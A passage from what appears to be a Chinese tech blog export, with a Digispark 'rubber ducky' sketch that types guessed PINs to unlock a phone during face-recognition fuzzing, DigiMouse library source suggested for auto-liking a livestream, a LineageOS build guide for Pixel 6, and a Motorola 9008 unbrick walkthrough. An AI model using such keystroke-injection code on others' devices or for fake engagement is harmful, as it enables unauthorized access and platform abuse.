enter</p><p>实现代码，实际使用的时候，需要根据每次人脸识别模糊测试的时间间隔来判定大概多长时间输入一次正确密码，然后将具体的逻辑放到 loop 作用域中。</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-id">#include</span> &quot;DigiKeyboard<span class="hljs-selector-class">.h</span>&quot;<br>void <span class="hljs-built_in">setup</span>() &#123;<br>  <span class="hljs-comment">// put your setup code here, to run once:</span><br>  DigiKeyboard<span class="hljs-selector-class">.delay</span>(<span class="hljs-number">2000</span>); <br>  <br>  DigiKeyboard<span class="hljs-selector-class">.sendKeyStroke</span>(KEY_SPACE); <br>  DigiKeyboard<span class="hljs-selector-class">.delay</span>(<span class="hljs-number">300</span>);<br>  DigiKeyboard<span class="hljs-selector-class">.sendKeyStroke</span>(KEY_SPACE);<br>  DigiKeyboard<span class="hljs-selector-class">.delay</span>(<span class="hljs-number">300</span>);<br>  DigiKeyboard<span class="hljs-selector-class">.println</span>(&quot;<span class="hljs-number">1234</span>&quot;);<br>  DigiKeyboard<span class="hljs-selector-class">.delay</span>(<span class="hljs-number">300</span>);<br>  DigiKeyboard<span class="hljs-selector-class">.println</span>(&quot;<span class="hljs-number">2345</span>&quot;);<br>  DigiKeyboard<span class="hljs-selector-class">.delay</span>(<span class="hljs-number">300</span>);<br>  DigiKeyboard<span class="hljs-selector-class">.println</span>(&quot;<span class="hljs-number">9876</span>&quot;);<br>  DigiKeyboard<span class="hljs-selector-class">.sendKeyStroke</span>(KEY_ENTER);<br>&#125;<br> <br>void <span class="hljs-built_in">loop</span>() &#123;<br>  <span class="hljs-comment">// put your main code here, to run repeatedly:</span><br>&#125;<br></code></pre></td></tr></table></figure><p>参考：打造廉价橡皮鸭 <a href="https://cloud.tencent.com/developer/article/1358453">https://cloud.tencent.com/developer/article/1358453</a> </p><h2 id="模拟鼠标滑动和点击"><a href="#模拟鼠标滑动和点击" class="headerlink" title="模拟鼠标滑动和点击"></a>模拟鼠标滑动和点击</h2><p>我一个朋友问我如何给他女朋友的直播间不停的刷赞，于是我想到了Digispark， 同样的，在Digispark 库中也有对鼠标支持的API，并且实现功能的思路一样简单。</p><p>模拟鼠标<br><a href="https://blog.csdn.net/bjbz_cxy/article/details/120322499">https://blog.csdn.net/bjbz_cxy/article/details/120322499</a></p><p>有关鼠标的API 再DigiMouse.h 中<br><img src="/53__Digispark_%E5%AE%9E%E7%8E%B0%E9%94%AE%E7%9B%98%E5%92%8C%E9%BC%A0%E6%A0%87.assets/image-20241023224525991.png"><br>其中的readme 阐述了mouse 的代码主要借鉴了Digispark键盘库以及Raphaël Assénat使用atmega8作为任天堂Gamecube&#x2F;N64控制器到USB桥接器的代码：<a href="http://www.raphnet.net/electronique/gc_n64_usb/index_en.php">http://www.raphnet.net/electronique/gc_n64_usb&#x2F;index_en.php</a> ，以及康奈尔大学的Yiyin Ma和Abby Lin的工作 <a href="https://instruct1.cit.cornell.edu/courses/ee476/FinalProjects/s2007/ayl26_ym82/ayl26_ym82/index.htm">https://instruct1.cit.cornell.edu/courses/ee476/FinalProjects/s2007/ayl26_ym82&#x2F;ayl26_ym82&#x2F;index.htm</a></p><p>其中提供可以模拟鼠标操作的API 有如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">DigiMouseDevice</span> &#123;<br> <span class="hljs-keyword">public</span>:<br><span class="hljs-built_in">DigiMouseDevice</span> () &#123;<br><br>rt_usbHidReportDescriptor = mouse_usbHidReportDescriptor;<br>rt_usbHidReportDescriptorSize = <span class="hljs-built_in">sizeof</span>(mouse_usbHidReportDescriptor);<br>rt_usbDeviceDescriptor = usbDescrDevice;<br>rt_usbDeviceDescriptorSize = <span class="hljs-built_in">sizeof</span>(usbDescrDevice);<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">begin</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">cli</span>();<br><span class="hljs-built_in">usbDeviceDisconnect</span>();<br>_delay_ms(<span class="hljs-number">200</span>);<br><span class="hljs-built_in">usbDeviceConnect</span>();<br><br><span class="hljs-built_in">usbInit</span>();<br><br><span class="hljs-built_in">sei</span>();<br>last_report_time = <span class="hljs-built_in">millis</span>();<br>&#125;<br><br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">refresh</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">update</span>();<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">poll</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">update</span>();<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">update</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-built_in">usbPoll</span>();<br><br><span class="hljs-comment">// instead of above code, use millis arduino system to enforce minimum reporting frequency</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> time_since_last_report = <span class="hljs-built_in">millis</span>() - last_report_time;<br><span class="hljs-keyword">if</span> (time_since_last_report &gt;= (idle_rate * <span class="hljs-number">4</span> <span class="hljs-comment">/* in units of 4ms - usb spec stuff */</span>)) &#123;<br>last_report_time += idle_rate * <span class="hljs-number">4</span>;<br>must_report = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// if the report has changed, try force an update anyway</span><br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">memcmp</span>(last_built_report, last_sent_report, REPORT_SIZE)) &#123;<br>must_report = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-comment">// if we want to send a report, signal the host computer to ask us for it with a usb &#x27;interrupt&#x27;</span><br><span class="hljs-keyword">if</span> (must_report) &#123;<br><span class="hljs-keyword">if</span> (<span class="hljs-built_in">usbInterruptIsReady</span>()) &#123;<br>must_report = <span class="hljs-number">0</span>;<br><span class="hljs-built_in">buildReport</span>(reportBuffer); <span class="hljs-comment">// put data into reportBuffer</span><br><span class="hljs-built_in">clearMove</span>(); <span class="hljs-comment">// clear deltas</span><br><span class="hljs-built_in">usbSetInterrupt</span>(reportBuffer, REPORT_SIZE);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-comment">// delay while updating until we are finished</span><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">delay</span><span class="hljs-params">(<span class="hljs-type">long</span> milli)</span> </span>&#123;<br><span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> last = <span class="hljs-built_in">millis</span>();<br>  <span class="hljs-keyword">while</span> (milli &gt; <span class="hljs-number">0</span>) &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> now = <span class="hljs-built_in">millis</span>();<br>    milli -= now - last;<br>    last = now;<br>    <span class="hljs-built_in">update</span>();<br>  &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">moveX</span><span class="hljs-params">(<span class="hljs-type">char</span> deltaX)</span></span>&#123;<br><span class="hljs-keyword">if</span> (deltaX == <span class="hljs-number">-128</span>) deltaX = <span class="hljs-number">-127</span>;<br>last_built_report[<span class="hljs-number">1</span>] = *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *&gt;(&amp;deltaX));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">moveY</span><span class="hljs-params">(<span class="hljs-type">char</span> deltaY)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (deltaY == <span class="hljs-number">-128</span>) deltaY = <span class="hljs-number">-127</span>;<br>last_built_report[<span class="hljs-number">2</span>] = *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *&gt;(&amp;deltaY));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">scroll</span><span class="hljs-params">(<span class="hljs-type">char</span> deltaS)</span></span>&#123;<br><span class="hljs-keyword">if</span> (deltaS == <span class="hljs-number">-128</span>) deltaS = <span class="hljs-number">-127</span>;<br>last_built_report[<span class="hljs-number">3</span>] = *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *&gt;(&amp;deltaS)); <br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">move</span><span class="hljs-params">(<span class="hljs-type">char</span> deltaX, <span class="hljs-type">char</span> deltaY, <span class="hljs-type">char</span> deltaS)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (deltaX == <span class="hljs-number">-128</span>) deltaX = <span class="hljs-number">-127</span>;<br><span class="hljs-keyword">if</span> (deltaY == <span class="hljs-number">-128</span>) deltaY = <span class="hljs-number">-127</span>;<br><span class="hljs-keyword">if</span> (deltaS == <span class="hljs-number">-128</span>) deltaS = <span class="hljs-number">-127</span>;<br>last_built_report[<span class="hljs-number">1</span>] = *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *&gt;(&amp;deltaX));<br>last_built_report[<span class="hljs-number">2</span>] = *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *&gt;(&amp;deltaY));<br>last_built_report[<span class="hljs-number">3</span>] = *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *&gt;(&amp;deltaS));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">move</span><span class="hljs-params">(<span class="hljs-type">char</span> deltaX, <span class="hljs-type">char</span> deltaY, <span class="hljs-type">char</span> deltaS, <span class="hljs-type">char</span> buttons)</span> </span>&#123;<br><span class="hljs-keyword">if</span> (deltaX == <span class="hljs-number">-128</span>) deltaX = <span class="hljs-number">-127</span>;<br><span class="hljs-keyword">if</span> (deltaY == <span class="hljs-number">-128</span>) deltaY = <span class="hljs-number">-127</span>;<br><span class="hljs-keyword">if</span> (deltaS == <span class="hljs-number">-128</span>) deltaS = <span class="hljs-number">-127</span>;<br>last_built_report[<span class="hljs-number">0</span>] = buttons;<br>last_built_report[<span class="hljs-number">1</span>] = *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *&gt;(&amp;deltaX));<br>last_built_report[<span class="hljs-number">2</span>] = *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *&gt;(&amp;deltaY));<br>last_built_report[<span class="hljs-number">3</span>] = *(<span class="hljs-built_in">reinterpret_cast</span>&lt;<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *&gt;(&amp;deltaS));<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">rightClick</span><span class="hljs-params">()</span></span>&#123;<br>last_built_report[<span class="hljs-number">0</span>] = MOUSEBTN_RIGHT_MASK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">leftClick</span><span class="hljs-params">()</span></span>&#123;<br>last_built_report[<span class="hljs-number">0</span>] = MOUSEBTN_RIGHT_MASK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">middleClick</span><span class="hljs-params">()</span></span>&#123;<br>last_built_report[<span class="hljs-number">0</span>] = MOUSEBTN_RIGHT_MASK;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setButtons</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> buttons)</span> </span>&#123;<br>last_built_report[<span class="hljs-number">0</span>] = buttons;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">setValues</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> values[])</span> </span>&#123;<br><span class="hljs-built_in">memcpy</span>(last_built_report, values, REPORT_SIZE);<br>&#125;<br><br><span class="hljs-comment">//private: <span class="hljs-doctag">TODO:</span> Make friend?</span><br><span class="hljs-comment">// what does this even mean? -- Bluebie</span><br>&#125;;<br></code></pre></td></tr></table></figure><p>关于在Arduino中使用这个代码，像使用其他库一样#include “DigiMouse.h”。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Build LineageOS for pixel6</title>
    <link href="/2024/10/12/Build_LineageOS_for_pixel6P/"/>
    <url>/2024/10/12/Build_LineageOS_for_pixel6P/</url>
    
    <content type="html"><![CDATA[<h1 id="Build-LineageOS-for-pixel6"><a href="#Build-LineageOS-for-pixel6" class="headerlink" title="Build LineageOS for pixel6"></a>Build LineageOS for pixel6</h1><p>LineageOS 是一个基于 Android 的开源操作系统，以其高度的定制性、安全性和隐私保护而闻名。它起源于著名的 CyanogenMod 项目，并在 2016 年重组后继续发展，目前已经成为拥有庞大用户群和活跃开发者社区的开源项目。本节的内容是关于给pixel6 编译LineageOS，在参照lineageOS 官网的编译流程  <a href="https://wiki.lineageos.org/devices/raven/build/">https://wiki.lineageos.org/devices/raven/build/</a> 并不能很顺利的编译，会碰各种各样的错误。</p><p>首先按照lineageOS 官网build 文档搭建对应的环境，比如所需的python 环境，Java 环境等，还有一些依赖库，这里要注意的是python 必须是3.8 版本，不然在执行breakfast 会报错。</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">apt <span class="hljs-keyword">install </span><span class="hljs-keyword">bc </span><span class="hljs-keyword">bison </span><span class="hljs-keyword">build-essential </span>ccache curl flex g++-<span class="hljs-keyword">multilib </span>gcc-<span class="hljs-keyword">multilib </span>git git-lfs gnupg gperf imagemagick lib32readline-dev lib32z1-dev libelf-dev liblz4-tool libsdl1.<span class="hljs-number">2</span>-dev libssl-dev libxml2 libxml2-utils lzop pngcrush rsync <span class="hljs-keyword">schedtool </span>squashfs-tools xsltproc zip zlib1g-dev<br><br>apt <span class="hljs-keyword">install </span>lib32ncurses5-dev libncurses5 libncurses5-dev<br><br>apt <span class="hljs-keyword">install </span>libwxgtk3.<span class="hljs-number">0</span>-dev<br></code></pre></td></tr></table></figure><p>然后同步源码，之后拉取要编译设备的配置文件和内核文件。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash">repo init -u https://github.com/LineageOS/android.git -b lineage-21.0 --git-lfs<br>repo <span class="hljs-built_in">sync</span><br><br><span class="hljs-built_in">source</span> build/envsetup.sh<br>breakfast raven  // 指定设备代号，拉取对应的配置文件和内核文件。<br></code></pre></td></tr></table></figure><p>这里在执行breakfast 的时候，会出现<code>vendor/google/raven/raven-vendor.mk does not exit...</code> 错误。<br><img src="/Build_LineageOS_for_pixel6P.assets/image-20240701162530674.png"><br>这是由于没有vendor blob 的原因，在官方文档中有说明这一点<br><img src="/Build_LineageOS_for_pixel6P.assets/image-20240701231340106.png"><br>其实如果把lineageOS不同设备的编译文档都看一遍，lineageOs 对于不同的设备来说，其实基础源码库都是相同的，不同的点在于下载vender device 对应的vendor 代码。要解决breakfast 的问题，需要从lineageOS 设备中提取专有的blob，官方的解决办法如下： <a href="https://wiki.lineageos.org/extracting_blobs_from_zips">https://wiki.lineageos.org/extracting_blobs_from_zips</a> ， 官网中提供了三种办法来提取专有的blob，我尝试了重lineageOS 安装包中提，编译的过程中会出现很多的错误，虽然不断修正错误，但依旧于事无补。</p><p>在这里找到了直接同步设备vendor的办法： <a href="https://gist.github.com/fourkbomb/261ced58cd029c5f7742350aafdd9825">https://gist.github.com/fourkbomb/261ced58cd029c5f7742350aafdd9825</a> 。<br>从 <a href="https://github.com/TheMuppets/manifests/blob/lineage-21.0/muppets.xml">https://github.com/TheMuppets/manifests/blob/lineage-21.0/muppets.xml</a> 获取到raven&#x2F;vendor，然后加入到 <code>.repo/local_manifests/roomservice.xml</code><br><img src="/Build_LineageOS_for_pixel6P.assets/image-20240823151917570.png"><br>重新同步一下代码 <code>repo sync</code><br><img src="/Build_LineageOS_for_pixel6P.assets/image-20240701224408259.png"><br>现在执行<code>breakfast raven</code><br><img src="/Build_LineageOS_for_pixel6P.assets/image-20240701224534356.png"><br>解决完 vendor blob 的问题后，基本上编译不会出其他的问题了,编译一路畅通。</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">croot</span><br><span class="hljs-attribute">brunch raven</span><br></code></pre></td></tr></table></figure><p><img src="/Build_LineageOS_for_pixel6P.assets/image-20240701194828176.png"></p><p>最后将编译出来的产物直接刷入到设备中即可。</p><p>我还尝试将pixel 6P 编译出来的Kernelsu 镜像单独刷入到LineageOS 中，系统没有出现其他的异常，可能得益于GKI ，android官方的boot.img 和 lineageOS 编译出来的boot.img 是通用的。<br>这里需要说明一下，GKI（通用内核）推出后，部分设备的内核和Android的源码库可以分离、单独编译内核和系统。不过Lineage还是放一起的，比如在pixel 6P 中，内核和系统源码已经分离了，在pixel 5中内核代码和系统源码还是在一起的，对pixel 内核有定制化需求的可以直接使用lineageOS。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>motorola_通过9008救砖</title>
    <link href="/2024/10/12/motorola_%E9%80%9A%E8%BF%879008%E6%95%91%E7%A0%96/"/>
    <url>/2024/10/12/motorola_%E9%80%9A%E8%BF%879008%E6%95%91%E7%A0%96/</url>
    
    <content type="html"><![CDATA[<h1 id="motorola-通过9008救砖"><a href="#motorola-通过9008救砖" class="headerlink" title="motorola_通过9008救砖"></a>motorola_通过9008救砖</h1><p>常在河边走，哪有不湿鞋，在一次对Motorola 设备进行操作的时候，导致设备处于硬砖状态，bootloader 损坏，这种情况下，将无法再访问Fastboot模式，手机无法正常开机，解硬砖就需要进入深度刷机的模式，配合高通的9008端口模式，进而恢复设备的bootloader。</p><p>通过9008救砖需要制作一根高通线，淘宝有的买，网上称为小米工程线，可以辅助手机进入高通模式，强开高通的9008端口进行刷机，而且还可以无视手机的BL锁。</p><p><img src="/motorola_%E9%80%9A%E8%BF%879008%E6%95%91%E7%A0%96.assets/image-20241012150912800.png" alt="image-20241012150912800"></p><p>制作一根也不难，直接将一根具备数据传输功能充电线表皮剥开，你会看到四根线，如果只有红黑两根线，只有充电功能，其中绿色和黑色的线分别是火线和零线，用小刀轻轻的将这两根线的表皮刮下来露出其中的铜丝，一定不要过于用力然后直接切断了。</p><p><img src="/motorola_%E9%80%9A%E8%BF%879008%E6%95%91%E7%A0%96.assets/image-20240823163548813.png" alt="image-20241012150912800"></p><p>将绿色的线和黑色的线短接后，插入到设备中，大概5秒钟，就可以看到9008端口。<br><img src="/motorola_%E9%80%9A%E8%BF%879008%E6%95%91%E7%A0%96.assets/image-20240814173201778.png"><br>下载对应的blankflash ： <a href="https://mirrors.lolinet.com/firmware/lenomola/2021/pstar_retcn/blankflash/">https://mirrors.lolinet.com/firmware/lenomola/2021/pstar_retcn/blankflash/</a><br><img src="/motorola_%E9%80%9A%E8%BF%879008%E6%95%91%E7%A0%96.assets/image-20240814172819895.png"><br>现在同时按住音量-  和电源按钮，并在同时按住的时候启动 blank-flash.bat<br><img src="/motorola_%E9%80%9A%E8%BF%879008%E6%95%91%E7%A0%96.assets/image-20240814173117616.png">之后手机就会自动开启到 bootloader 界面。<br>下载完整的系统固件<br><code>XT2153-1_PSTAR_CMCC_11_RRAA31.Q3-19-86_subsidy-DEFAULT_regulatory-DEFAULT_CFC.xml.zip</code><br>解开zip 包后，可以看到很多的镜像<br><img src="/motorola_%E9%80%9A%E8%BF%879008%E6%95%91%E7%A0%96.assets/image-20240814173426703.png"><br>由于固件包中没有 flash-all.bat 文件，所以要留意一些XML文件，类似于 flashfile.xml、servicefile.xml 文件，打开其中的一个flashfile.xml 文件，可以理解到这里的一些含义，将不同的固件刷入到对应的分区中。<br><img src="/motorola_%E9%80%9A%E8%BF%879008%E6%95%91%E7%A0%96.assets/image-20240814173747397.png"><br>写了一个脚本提取要刷入的分区和镜像</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs routeros">import xml.etree.ElementTree as ET<br><br><span class="hljs-comment"># 要解析的XML文件路径</span><br>xml_file = <span class="hljs-string">&#x27;flashfile.xml&#x27;</span><br><br><span class="hljs-comment"># 解析XML文件并获取根元素</span><br>tree = ET.parse(xml_file)<br>root = tree.getroot()<br><br><span class="hljs-comment"># 确保根元素是&lt;flashing&gt;</span><br><span class="hljs-keyword">if</span> root.tag == <span class="hljs-string">&#x27;flashing&#x27;</span>:<br>    # 找到所有&lt;<span class="hljs-keyword">step</span>&gt;元素<br>    steps = root.findall(<span class="hljs-string">&#x27;.//step&#x27;</span>)<br>    <span class="hljs-keyword">for</span> <span class="hljs-keyword">step</span> <span class="hljs-keyword">in</span> steps:<br>        # 获取filename和partition属性<br>        filename = <span class="hljs-keyword">step</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;filename&#x27;</span>)<br>        partition = <span class="hljs-keyword">step</span>.<span class="hljs-built_in">get</span>(<span class="hljs-string">&#x27;partition&#x27;</span>)<br>        <span class="hljs-keyword">if</span> filename <span class="hljs-keyword">and</span> partition:  # 确保属性存在<br>            # 按照指定格式输出<br>            <span class="hljs-built_in">print</span>(f<span class="hljs-string">&quot;fastboot flash &#123;partition&#125; &#123;filename&#125;&quot;</span>)<br><span class="hljs-keyword">else</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;The XML file does not have the expected structure.&quot;</span>)<br></code></pre></td></tr></table></figure><p>提取出来后如下所示</p><figure class="highlight monkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs monkey">fastboot flash partition gpt.bin<br>fastboot flash bootloader bootloader.img<br>fastboot flash vbmeta vbmeta.img<br>fastboot flash vbmeta_system vbmeta_system.img<br>fastboot flash modem NON-HLOS.bin<br>fastboot flash fsg fsg.mbn<br>fastboot flash bluetooth BTFM.bin<br>fastboot flash dsp dspso.bin<br>fastboot flash logo logo.bin<br>fastboot flash boot boot.img<br>fastboot flash vendor_boot vendor_boot.img<br>fastboot flash dtbo dtbo.img<br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">0</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">1</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">2</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">3</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">4</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">5</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">6</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">7</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">8</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">9</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">10</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">11</span><br>fastboot flash <span class="hljs-variable language_">super</span> <span class="hljs-variable language_">super</span>.img_sparsechunk.<span class="hljs-number">12</span><br></code></pre></td></tr></table></figure><p>在刷入的时候，建议按照XML文件中提到的顺序来进行刷写，不然会还是会变成砖。</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Google Securitybulletins CVE-2023-48409 漏洞分析</title>
    <link href="/2024/08/07/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    <url>/2024/08/07/59__Google%20Securitybulletins%20CVE-2023-48409%20%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/</url>
    
